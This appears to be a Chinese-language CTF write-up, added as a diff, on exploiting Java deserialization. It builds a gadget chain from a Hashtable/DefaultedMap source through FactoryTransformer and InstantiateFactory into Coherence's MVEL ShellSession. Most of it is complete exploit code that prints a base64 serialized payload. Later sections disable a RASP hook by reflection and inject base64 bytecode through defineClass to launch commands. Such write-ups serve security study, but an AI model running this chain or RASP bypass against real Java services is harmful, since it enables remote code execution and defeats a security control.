+
+我们来看ShellSession的单参数String的构造方法
+
+![image-20251201235734821](../assets/image-20251201235734821.png)
+
+这里会将参数传入exec方法，我们跟进
+
+![image-20251202000247308](../assets/image-20251202000247308.png)
+
+这里就是将命令按行分割后写入缓冲区，接着调用_exec执行，跟进
+
+![image-20251202000805200](../assets/image-20251202000805200.png)
+
+这里会将命令进行分割，判断第一个 token ，也就是inTokens[0]， 是否是一个预定义的内部命令。如果是内部命令，它会调用该命令对应的 `execute` 方法来执行，并传递后续的 tokens 作为参数，如果不是则会进入到else，并尝试作为MVEL 表达式来执行
+
+![image-20251202001321314](../assets/image-20251202001321314.png)
+
+![image-20251202001827798](../assets/image-20251202001827798.png)
+
+当执行MVEL表达式失败时（例如，对于像 `ls -l` 这样的非法表达式），_exec() 方法并不会立即报错，而是会启动一个智能的回退机制：如果 `$COMMAND_PASSTHRU` 环境变量被设为 `true`，它会转而将该命令视为一个操作系统的原生命令，并遍历 `$PATH` 环境变量中的所有目录来搜索对应的可执行文件，一旦找到，便会通过 `Runtime.getRuntime().exec()` 在操作系统层面启动该程序。既然都能执行mvel表达式了，感觉意义不大。可以直接利用mvel表达式命令执行。
+
+```
+ShellSession help = new ShellSession("Runtime.getRuntime().exec(\"calc\")");
+```
+
+![image-20251202002053046](../assets/image-20251202002053046.png)
+
+这道题我们用ShellSession作为Sink点
+
+### Source: Hashtable
+
+![image-20251202002444219](../assets/image-20251202002444219.png)
+
+可以看到CC7的Source Hashtable没有被waf，而且Defaultedmap也没有办，基本上可以确定cc7前半条链子都是可用的，如下
+
+```Java
+import com.tangosol.coherence.mvel2.sh.ShellSession;
+import org.apache.commons.collections.map.DefaultedMap;
+import org.apache.commons.collections.map.LinkedMap;
+
+import java.io.*;
+import java.util.Base64;
+import java.util.Hashtable;
+import java.util.Map;
+
+
+public class EXP {
+    public static void main(String[] args) throws IOException, ClassNotFoundException {
+//        new ShellSession("Runtime.getRuntime().exec(\"calc\")");
+        LinkedMap linkedMap1 = new LinkedMap();
+        LinkedMap linkedMap2 = new LinkedMap();
+        Map decoratemap1 = DefaultedMap.decorate(linkedMap1, "xrntkk1");
+        decoratemap1.put("xrntkk1", 1);
+        Map decoratemap2 = DefaultedMap.decorate(linkedMap2, "xrntkk2");
+        decoratemap2.put("xrntkk2", 2);
+        Hashtable<Object, Object> ObjectHashtable = new Hashtable<>();
+        ObjectHashtable.put(decoratemap1, "xrntkk1");
+        ObjectHashtable.put(decoratemap2, "xrntkk2");
+        System.out.println(linkedMap1.hashCode());
+        System.out.println(linkedMap1.hashCode());
+        serialize(ObjectHashtable);
+        unserialize();
+
+    }
+    public  static String serializeBase64(Object obj) throws IOException {
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(obj);
+        objectOutputStream.close();
+
+        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+    }
+    public static void serialize(Object o) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(o);
+    }
+
+    public static Object unserialize() throws IOException, ClassNotFoundException {
+        SecurityObjectInputStream ois = new SecurityObjectInputStream(new FileInputStream("ser.bin"));
+        Object o = ois.readObject();
+        return o;
+    }
+
+}
+
+```
+
+实现任意transformer方法调用
+
+
+
+
+
+### 中间链子
+
+ org.apache.commons.collections4.functors.InstantiateFactory#create
+
+![image-20251202093252482](../assets/image-20251202093252482.png)
+
+InstantiateFactory可以调用任意构造方法，而FactoryTransformer的transform方法可以调用Factory类型的create方法
+
+![image-20251202094937722](../assets/image-20251202094937722.png)
+
+所以链子如下
+
+```Java
+import com.tangosol.coherence.mvel2.sh.ShellSession;
+import org.apache.commons.collections.functors.FactoryTransformer;
+import org.apache.commons.collections.functors.InstantiateFactory;
+import org.apache.commons.collections.map.DefaultedMap;
+import org.apache.commons.collections.map.LinkedMap;
+
+import java.io.*;
+import java.util.Base64;
+import java.util.Hashtable;
+import java.util.Map;
+
+
+public class EXP {
+    public static void main(String[] args) throws IOException, ClassNotFoundException {
+//        new ShellSession("Runtime.getRuntime().exec(\"calc\")");
+
+        FactoryTransformer factoryTransformer = new FactoryTransformer(new InstantiateFactory(ShellSession.class, new Class[]{String.class}, new Object[]{"Runtime.getRuntime().exec(\"calc\")"}));
+        LinkedMap linkedMap1 = new LinkedMap();
+        LinkedMap linkedMap2 = new LinkedMap();
+        Map decoratemap1 = DefaultedMap.decorate(linkedMap1, "xrntkk1");
+        decoratemap1.put("xrntkk1", 1);
+        Map decoratemap2 = DefaultedMap.decorate(linkedMap2, factoryTransformer);
+        decoratemap2.put("xrntkk2", 2);
+        Hashtable<Object, Object> ObjectHashtable = new Hashtable<>();
+        ObjectHashtable.put(decoratemap1, "xrntkk1");
+        ObjectHashtable.put(decoratemap2, "xrntkk2");
+        System.out.println(linkedMap1.hashCode());
+        System.out.println(linkedMap1.hashCode());
+        serialize(ObjectHashtable);
+        unserialize();
+
+
+
+    }
+    public  static String serializeBase64(Object obj) throws IOException {
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(obj);
+        objectOutputStream.close();
+
+        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+    }
+    public static void serialize(Object o) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(o);
+    }
+
+    public static Object unserialize() throws IOException, ClassNotFoundException {
+        SecurityObjectInputStream ois = new SecurityObjectInputStream(new FileInputStream("ser.bin"));
+        Object o = ois.readObject();
+        return o;
+    }
+    
+}
+
+
+```
+
+
+
+### Rasp bypass
+
+![image-20251202105118348](../assets/image-20251202105118348.png)
+
+还有最后一关，也就是rasp
+
+![image-20251202162822805](../assets/image-20251202162822805.png)
+
+在awd-rasp里面有一个叫doRCEHook的静态变量，我们可以从线程中拿到RceHook类，并通过反射将其设置为false，当其为false的时候就不会拦截命令执行。
+
+```Java
+import com.tangosol.coherence.mvel2.sh.ShellSession;
+import org.apache.commons.collections.functors.FactoryTransformer;
+import org.apache.commons.collections.functors.InstantiateFactory;
+import org.apache.commons.collections.map.DefaultedMap;
+import org.apache.commons.collections.map.LinkedMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.Hashtable;
+import java.util.Map;
+import java.util.Set;
+
+
+public class EXP {
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+//        new ShellSession("Runtime.getRuntime().exec(\"calc\")");
+//        Runtime.getRuntime().load("D:\\Downloads\\src-new\\awd-bypass\\test.dll");
+//        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+//        Class<?> aClass = classLoader.loadClass("com.rasp.hooks.RceHook");
+//        System.out.println(aClass);
+//        Field[] declaredFields = aClass.getDeclaredFields();
+//        for (Field declaredField : declaredFields) {
+//            System.out.println(declaredField);
+//        }
+
+        FactoryTransformer factoryTransformer = new FactoryTransformer(new InstantiateFactory(ShellSession.class, new Class[]{String.class}, new Object[]{"doRCEHook=Thread.currentThread().getContextClassLoader().loadClass(\"com.rasp.hooks.RceHook\").getDeclaredField(\"doRCEHook\");doRCEHook.setAccessible(true);doRCEHook.set(null, false);Runtime.getRuntime().exec(\"calc\")"}));
+
+        LinkedMap linkedMap1 = new LinkedMap();
+        LinkedMap linkedMap2 = new LinkedMap();
+        Map decoratemap1 = DefaultedMap.decorate(linkedMap1, "xrntkk1");
+        decoratemap1.put("xrntkk1", 1);
+        Map decoratemap2 = DefaultedMap.decorate(linkedMap2, factoryTransformer);
+        decoratemap2.put("xrntkk2", 2);
+        Hashtable<Object, Object> ObjectHashtable = new Hashtable<>();
+        ObjectHashtable.put(decoratemap1, "xrntkk1");
+        ObjectHashtable.put(decoratemap2, "xrntkk2");
+//        System.out.println(linkedMap1.hashCode());
+//        System.out.println(linkedMap1.hashCode());
+//        serialize(ObjectHashtable);
+//        unserialize();
+        String s = serializeBase64(ObjectHashtable);
+        System.out.println(s);
+    }
+    public  static String serializeBase64(Object obj) throws IOException {
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(obj);
+        objectOutputStream.close();
+
+        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+    }
+    public static void serialize(Object o) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(o);
+    }
+
+    public static Object unserialize() throws IOException, ClassNotFoundException {
+        SecurityObjectInputStream ois = new SecurityObjectInputStream(new FileInputStream("ser.bin"));
+        Object o = ois.readObject();
+        return o;
+    }
+
+}
+
+
+```
+
+加载任意字节码
+
+```Java
+import com.tangosol.coherence.mvel2.sh.ShellSession;
+import org.apache.commons.collections.functors.FactoryTransformer;
+import org.apache.commons.collections.functors.InstantiateFactory;
+import org.apache.commons.collections.map.DefaultedMap;
+import org.apache.commons.collections.map.LinkedMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.util.Base64;
+import java.util.Hashtable;
+import java.util.Map;
+import java.util.Set;
+
+
+public class EXP {
+    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException {
+//        new ShellSession("Runtime.getRuntime().exec(\"calc\")");
+//        Runtime.getRuntime().load("D:\\Downloads\\src-new\\awd-bypass\\test.dll");
+//        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
+//        Class<?> aClass = classLoader.loadClass("com.rasp.hooks.RceHook");
+//        System.out.println(aClass);
+//        Field[] declaredFields = aClass.getDeclaredFields();
+//        for (Field declaredField : declaredFields) {
+//            System.out.println(declaredField);
+//        }
+
+//        FactoryTransformer factoryTransformer = new FactoryTransformer(new InstantiateFactory(ShellSession.class, new Class[]{String.class}, new Object[]{"doRCEHook=Thread.currentThread().getContextClassLoader().loadClass(\"com.rasp.hooks.RceHook\").getDeclaredField(\"doRCEHook\");doRCEHook.setAccessible(true);doRCEHook.set(null, false);Runtime.getRuntime().exec(\"calc\")"}));
+
+        FactoryTransformer factoryTransformer = new FactoryTransformer(new InstantiateFactory(ShellSession.class, new Class[]{String.class}, new Object[]{"doRCEHook=Thread.currentThread().getContextClassLoader().loadClass(\"com.rasp.hooks.RceHook\").getDeclaredField(\"doRCEHook\");doRCEHook.setAccessible(true);doRCEHook.set(null, false);bytes = java.util.Base64.getDecoder().decode(\"yv66vgAAADIAQAEAbm9yZy9hcGFjaGUvY29sbGVjdGlvbnMvY295b3RlL2Rlc2VyaWFsaXphdGlvbi9zdGQvU3RyaW5nQ29sbGVjdGlvbkRlc2VyaWFsaXplcjZmOWY0OWQ2MDM4MzQ3YmQ4MTJkY2ZkMTgwMGM4MDRlBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEABGJhc2UBABJMamF2YS9sYW5nL1N0cmluZzsBAANzZXABAANjbWQBAAY8aW5pdD4BAAMoKVYBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwALDAAJAAoKAAQADQEAB29zLm5hbWUIAA8BABBqYXZhL2xhbmcvU3lzdGVtBwARAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwAEwAUCgASABUBABBqYXZhL2xhbmcvU3RyaW5nBwAXAQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwwAGQAaCgAYABsBAAN3aW4IAB0BAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwAHwAgCgAYACEBAAdjbWQuZXhlCAAjDAAFAAYJAAIAJQEAAi9jCAAnDAAHAAYJAAIAKQEABy9iaW4vc2gIACsBAAItYwgALQwACAAGCQACAC8BABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIHADEBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWDAAJADMKADIANAEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7DAA2ADcKADIAOAEACDxjbGluaXQ+AQAEY2FsYwgAOwoAAgANAQAEQ29kZQEADVN0YWNrTWFwVGFibGUAIQACAAQAAAADAAkABQAGAAAACQAHAAYAAAAJAAgABgAAAAIAAQAJAAoAAQA+AAAAhAAEAAIAAABTKrcADhIQuAAWtgAcEh62ACKZABASJLMAJhIoswAqpwANEiyzACYSLrMAKga9ABhZA7IAJlNZBLIAKlNZBbIAMFNMuwAyWSu3ADW2ADlXpwAETLEAAQAEAE4AUQAMAAEAPwAAABcABP8AIQABBwACAAAJZQcADPwAAAcABAAIADoACgABAD4AAAAaAAIAAAAAAA4SPLMAMLsAAlm3AD1XsQAAAAAAAA==\");systemClassLoader = ClassLoader.getSystemClassLoader();defineClass = java.lang.Class.forName(\"java.lang.ClassLoader\").getDeclaredMethod(\"defineClass\", java.lang.Class.forName(\"java.lang.String\"), java.lang.Class.forName(\"[B\"), java.lang.Integer.TYPE, java.lang.Integer.TYPE);defineClass.setAccessible(true);defineClass.invoke(systemClassLoader, \"org.apache.collections.coyote.deserialization.std.StringCollectionDeserializer6f9f49d6038347bd812dcfd1800c804e\",bytes,0, bytes.length);systemClassLoader.loadClass(\"org.apache.collections.coyote.deserialization.std.StringCollectionDeserializer6f9f49d6038347bd812dcfd1800c804e\").newInstance();"}));
+
+
+        LinkedMap linkedMap1 = new LinkedMap();
+        LinkedMap linkedMap2 = new LinkedMap();
+        Map decoratemap1 = DefaultedMap.decorate(linkedMap1, "xrntkk1");
+        decoratemap1.put("xrntkk1", 1);
+        Map decoratemap2 = DefaultedMap.decorate(linkedMap2, factoryTransformer);
+        decoratemap2.put("xrntkk2", 2);
+        Hashtable<Object, Object> ObjectHashtable = new Hashtable<>();
+        ObjectHashtable.put(decoratemap1, "xrntkk1");
+        ObjectHashtable.put(decoratemap2, "xrntkk2");
+//        System.out.println(linkedMap1.hashCode());
+//        System.out.println(linkedMap1.hashCode());
+//        serialize(ObjectHashtable);
+//        unserialize();
+        String s = serializeBase64(ObjectHashtable);
+        System.out.println(s);
+    }
+    public  static String serializeBase64(Object obj) throws IOException {
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+        objectOutputStream.writeObject(obj);
+        objectOutputStream.close();
+
+        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
+    }
+    public static void serialize(Object o) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+        oos.writeObject(o);
+    }
+
+    public static Object unserialize() throws IOException, ClassNotFoundException {
+        SecurityObjectInputStream ois = new SecurityObjectInputStream(new FileInputStream("ser.bin"));
+        Object o = ois.readObject();
+        return o;
+    }
+
+}
+
+
+```
+
